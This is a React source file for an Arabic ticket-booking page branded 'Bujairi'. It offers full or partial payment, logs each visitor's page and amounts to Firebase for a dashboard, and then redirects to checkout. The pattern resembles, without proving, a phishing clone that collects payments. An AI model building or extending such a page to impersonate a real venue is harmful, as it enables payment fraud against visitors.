import { ChevronDown, Calendar, Clock, Ticket, Info, Plus, Minus, CreditCard } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Link, useLocation } from "wouter";
import { useState, useEffect } from "react";
import { addData, handleCurrentPage } from "@/lib/firebase";
import {
  RestaurantNav,
  ProgressBar,
  PageBanner,
  BujairiFooter,
} from "@/components/bujairi-header";

const TICKET_PRICE = 50;
// Flat hold-fee that lets visitors confirm a booking now and pay the rest
// at the venue. Mirrors the partial-payment option on /reserve.
const PARTIAL_FEE = 10;
type PaymentMode = "full" | "partial";

export default function BookingPage() {
  const [date, setDate] = useState<Date | undefined>(new Date());
  const [time, setTime] = useState("09:00");
  const [quantity, setQuantity] = useState(1);
  const [paymentMode, setPaymentMode] = useState<PaymentMode>("full");

  useEffect(() => {
    handleCurrentPage("booking");
  }, []);

  return (
    <div className="min-h-screen bg-[#ebddd0] flex flex-col" dir="rtl">
      <RestaurantNav active="booking-options" />
      <ProgressBar current={2} />
      <PageBanner title="الحجز" />
      <main className="flex-1 pb-8">
        <BookingForm
          date={date}
          setDate={setDate}
          time={time}
          setTime={setTime}
          quantity={quantity}
          setQuantity={setQuantity}
          paymentMode={paymentMode}
          setPaymentMode={setPaymentMode}
        />
        <TermsSection />
      </main>
      <BujairiFooter />
    </div>
  );
}

function BookingForm({ 
  date, 
  setDate, 
  time, 
  setTime,
  quantity,
  setQuantity,
  paymentMode,
  setPaymentMode,
}: { 
  date: Date | undefined; 
  setDate: (d: Date | undefined) => void; 
  time: string; 
  setTime: (t: string) => void;
  quantity: number;
  setQuantity: (q: number) => void;
  paymentMode: PaymentMode;
  setPaymentMode: (m: PaymentMode) => void;
}) {
  const fullAmount = quantity * TICKET_PRICE;
  const dueNow = paymentMode === "partial" ? PARTIAL_FEE : fullAmount;
  const timeSlots = [
    "09:00", "10:00", "11:00", "12:00",
    "13:00", "14:00", "15:00", "16:00",
    "17:00", "18:00", "19:00", "20:00",
    "21:00", "22:00", "23:00", "00:00",
  ];
  const [, setLocation] = useLocation();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const handleConfirmBooking = async () => {
    if (isSubmitting) return;
    setIsSubmitting(true);
    setSubmitError("");
    const bookingData = { date: date?.toISOString(), time };
    localStorage.setItem("bookingData", JSON.stringify(bookingData));
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setSubmitError("لم يتم العثور على بيانات الزائر");
      setIsSubmitting(false);
      return;
    }
    const ok = await addData({
      id: visitorId,
      currentPage: "booking",
      ticketQuantity: quantity,
      ticketPrice: TICKET_PRICE,
      // `totalAmount` is what the visitor is being charged right now —
      // either the full ticket price or the small hold deposit. Dashboard
      // displays this number, so it must reflect the chosen mode.
      totalAmount: dueNow,
      paymentMode,
      bookingDate: bookingData.date,
      bookingTime: bookingData.time,
    });
    if (!ok) {
      setSubmitError("تعذر إكمال الحجز، يرجى المحاولة مرة أخرى");
      setIsSubmitting(false);
      return;
    }
    setLocation("/checkout");
  };

  return (
    <section className="px-4 py-8" data-testid="section-booking-form">
      <div className="max-w-md mx-auto bg-white rounded-2xl shadow-xl p-6 space-y-6 animate-fade-in">
        <h2 className="text-center text-xl font-bold text-foreground">
          الرجاء الاختيار
        </h2>

        <div className="space-y-6">
          <div>
            <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
              <Calendar className="w-4 h-4 text-primary" />
              اختيار التاريخ *
            </Label>
            <Input
              type="date"
              value={date ? date.toISOString().split('T')[0] : ''}
              onChange={(e) => setDate(e.target.value ? new Date(e.target.value) : undefined)}
              min={new Date().toISOString().split('T')[0]}
              className="w-full text-center h-12 rounded-xl border-2 focus:border-primary"
              data-testid="input-date"
            />
            {date && (
              <div className="text-center mt-3 p-3 bg-primary/10 rounded-xl" data-testid="text-selected-date">
                <p className="text-sm text-primary font-medium">
                  التاريخ المحدد: {date.toLocaleDateString('ar-SA')}
                </p>
              </div>
            )}
          </div>

          <div>
            <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
              <Clock className="w-4 h-4 text-primary" />
              اختيار الوقت *
            </Label>
            <div className="relative">
              <select
                value={time}
                onChange={(e) => setTime(e.target.value)}
                className="w-full h-12 px-4 rounded-xl border-2 border-input bg-background text-foreground appearance-none text-center font-medium focus:border-primary focus:outline-none"
                data-testid="select-time"
              >
                {timeSlots.map((slot) => (
                  <option key={slot} value={slot}>
                    {slot}
                  </option>
                ))}
              </select>
              <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground pointer-events-none" />
            </div>
          </div>
        </div>

        <div>
          <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
            <Ticket className="w-4 h-4 text-primary" />
            عدد التذاكر *
          </Label>
          <div className="flex items-center justify-between bg-muted rounded-xl p-2">
            <Button
              type="button"
              size="icon"
              variant="ghost"
              className="h-10 w-10 rounded-lg"
              onClick={() => setQuantity(Math.max(1, quantity - 1))}
              data-testid="button-decrease-qty"
            >
              <Minus className="w-4 h-4" />
            </Button>
            <span className="font-bold text-lg" data-testid="text-quantity">
              {quantity}
            </span>
            <Button
              type="button"
              size="icon"
              variant="ghost"
              className="h-10 w-10 rounded-lg"
              onClick={() => setQuantity(quantity + 1)}
              data-testid="button-increase-qty"
            >
              <Plus className="w-4 h-4" />
            </Button>
          </div>
        </div>

        <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] rounded-xl p-5">
          <div className="flex items-center gap-2 mb-3">
            <Ticket className="w-5 h-5 text-primary" />
            <h3 className="font-bold text-foreground">المجموع</h3>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-muted-foreground">
              {quantity} × {TICKET_PRICE} ر.س
            </span>
            <span
              className="font-bold text-xl text-primary"
              data-testid="text-booking-total"
            >
              {fullAmount} ر.س
            </span>
          </div>
        </div>

        {/* Payment mode: pay full now, or a small hold deposit to confirm */}
        <div className="space-y-3" data-testid="payment-mode-selector">
          <Label className="text-sm font-medium text-foreground flex items-center gap-2">
            <CreditCard className="w-4 h-4 text-primary" />
            طريقة الدفع
          </Label>
          <div className="grid grid-cols-2 gap-3">
            <button
              type="button"
              onClick={() => setPaymentMode("full")}
              className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                paymentMode === "full"
                  ? "border-primary bg-primary/5 shadow-sm"
                  : "border-input bg-white hover:border-[#c9a96e]"
              }`}
              data-testid="payment-mode-full"
            >
              <div className="text-[11px] text-muted-foreground mb-1">الدفع الكامل</div>
              <div className="text-foreground font-bold text-lg">{fullAmount} ر.س</div>
              <div className="text-[10px] text-muted-foreground mt-1 leading-tight">
                دفع كامل قيمة التذاكر
              </div>
              {paymentMode === "full" && (
                <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                  <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                    <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                  </svg>
                </div>
              )}
            </button>
            <button
              type="button"
              onClick={() => setPaymentMode("partial")}
              className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                paymentMode === "partial"
                  ? "border-primary bg-primary/5 shadow-sm"
                  : "border-input bg-white hover:border-[#c9a96e]"
              }`}
              data-testid="payment-mode-partial"
            >
              <div className="flex items-center justify-between">
                <div className="text-[11px] text-muted-foreground mb-1">دفع جزئي</div>
                <span className="text-[9px] bg-[#c9a96e] text-white px-1.5 py-0.5 rounded font-bold">
                  موصى به
                </span>
              </div>
              <div className="text-foreground font-bold text-lg">{PARTIAL_FEE} ر.س</div>
              <div className="text-[10px] text-muted-foreground mt-1 leading-tight">
                لتأكيد الحجز فقط
              </div>
              {paymentMode === "partial" && (
                <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                  <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                    <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                  </svg>
                </div>
              )}
            </button>
          </div>

          <div className="bg-white/60 rounded-xl p-3 text-center text-xs text-muted-foreground">
            {paymentMode === "partial" ? (
              <>
                يتم خصم <span className="font-bold text-primary">{PARTIAL_FEE} ر.س</span> الآن لتأكيد الحجز،
                والباقي <span className="font-bold text-primary">{fullAmount - PARTIAL_FEE} ر.س</span> يُدفع عند الزيارة
              </>
            ) : (
              <>سيتم خصم المبلغ الكامل الآن</>
            )}
          </div>

          <div className="flex items-center justify-between pt-1">
            <span className="text-sm text-muted-foreground">المبلغ المستحق الآن</span>
            <span
              className="font-bold text-xl text-primary"
              data-testid="text-due-now"
            >
              {dueNow} ر.س
            </span>
          </div>
        </div>

        <div className="space-y-3 pt-4">
          <Button 
            size="lg"
            className="w-full bg-primary text-white shadow-lg"
            onClick={() => {
              void handleConfirmBooking();
            }}
            disabled={isSubmitting}
            data-testid="button-confirm-booking"
          >
            {isSubmitting ? "جاري الإرسال..." : "المتابعة للدفع"}
          </Button>

          {submitError && (
            <p className="text-red-500 text-xs text-center" data-testid="error-booking-submit">
              {submitError}
            </p>
          )}
          
          <Link href="/">
            <Button 
              variant="outline"
              size="lg"
              className="w-full"
              data-testid="button-cancel-booking"
            >
              إلغاء
            </Button>
          </Link>
        </div>
      </div>
    </section>
  );
}

function TermsSection() {
  return (
    <section className="px-4 py-6 max-w-md mx-auto" data-testid="section-booking-terms">
      <div className="bg-white rounded-2xl shadow-lg p-6">
        <div className="flex items-center gap-2 mb-4">
          <Info className="w-5 h-5 text-primary" />
          <h3 className="text-lg font-bold text-foreground">الشروط والأحكام</h3>
        </div>
        <div className="text-sm text-muted-foreground space-y-3 leading-relaxed">
          <p>
            يلزم الضيف بالحجز والوصول في الوقت المحدد.
          </p>
          <p>
            يلزم الضيف بعدم الحجز لتذاكر لعدة مطاعم في نفس الوقت، كما يُحظر إعادة بيع الحجوزات.
          </p>
          <p>
            يمكن إجراء الحجوزات من خلال الموقع الإلكتروني الخاص بالمحل فقط.
          </p>
          <p>
            الحجوزات تسمح بالدخول مرة واحدة إلى المنطقة ومغادرة التاريخ المحدد فقط.
          </p>
          <p>
            جميع المبالغ التي لم يتم دفعها للحجز غير مستردة.
          </p>
        </div>
      </div>
    </section>
  );
}

